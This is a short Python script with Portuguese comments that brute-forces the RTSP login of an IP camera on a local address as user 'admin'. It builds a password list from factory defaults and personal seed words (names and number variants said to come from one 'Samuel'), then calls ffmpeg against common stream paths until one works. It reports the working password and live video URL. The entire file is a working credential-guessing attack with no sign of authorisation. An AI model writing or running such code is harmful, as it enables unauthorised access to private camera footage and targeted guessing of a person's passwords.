import subprocess
import urllib.parse
import time

# Alvo
IP = "192.168.3.71"
USER = "admin"

# Sementes fornecidas pelo Samuel
SEEDS = ["Ol1ve1r", "Ol1veira", "samuel", "samuel283", "claudete", "tatiana", "martinez"]
SYMBOLS = ["@", "@@", "#", "##", ""]
DEFAULTS = ["123456", "admin", "888888", "12345", "000000", "111111"]

# Gerar Matriz Completa
PASSWDS = set(DEFAULTS)
for s in SEEDS:
    for sym in SYMBOLS:
        PASSWDS.add(f"{s}{sym}")
        PASSWDS.add(f"{s.capitalize()}{sym}")
        PASSWDS.add(f"{sym}{s}")
        PASSWDS.add(f"{sym}{s.capitalize()}")

# Caminhos de Video
PATHS = ["/live/ch0", "/stream1", "/cam/realmonitor?channel=1&subtype=0"]

def crack():
    print(f"🚀 INICIANDO BRUTE FORCE 2.0 - {len(PASSWDS)} combinações táticas.")
    for pw in PASSWDS:
        encoded_pw = urllib.parse.quote(pw)
        for path in PATHS:
            url = f"rtsp://admin:{encoded_pw}@{IP}:554{path}"
            cmd = ["/opt/homebrew/bin/ffmpeg", "-rtsp_transport", "tcp", "-i", url, "-t", "1", "-f", "null", "-"]
            
            try:
                # Teste rápido
                res = subprocess.run(cmd, capture_output=True, timeout=3)
                if res.returncode == 0:
                    return url, pw
            except:
                pass
    return None, None

if __name__ == "__main__":
    url, pwd = crack()
    if url:
        print(f"\n✅ SUCESSO ABSOLUTO! Senha: {pwd}")
        print(f"🔗 URL: {url}")
    else:
        print("\n❌ Matriz 2.0 concluída sem sucesso.")
